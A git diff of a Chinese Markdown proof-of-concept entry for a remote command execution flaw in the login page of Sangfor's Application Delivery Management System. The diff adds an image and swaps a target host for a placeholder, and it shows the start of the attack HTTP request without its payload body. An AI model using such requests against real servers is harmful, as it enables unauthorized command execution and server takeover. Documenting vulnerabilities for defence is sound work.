@@ -2,6 +2,10 @@
 
 深信服应用交付管理系统login存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限，执行任意命令
 
+
+![图片](https://github.com/Londly01/poc-hub/assets/118274389/916aedb1-dbe4-46d4-a960-9f51c7ced7f2)
+
+
 0x01 漏洞发布时间: 2023年8月9日
 
 0x02 漏洞影响
@@ -16,7 +20,7 @@ fid="iaytNA57019/kADk8Nev7g=="
 
 ```
 POST /rep/login HTTP/1.1
-Host: 1.1.1.1:85
+Host: xxxxxxxxxxx
 Cookie: UEDC_LOGIN_POLICY_VALUE=checked
 Content-Length: 124
 Sec-Ch-Ua: "Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"
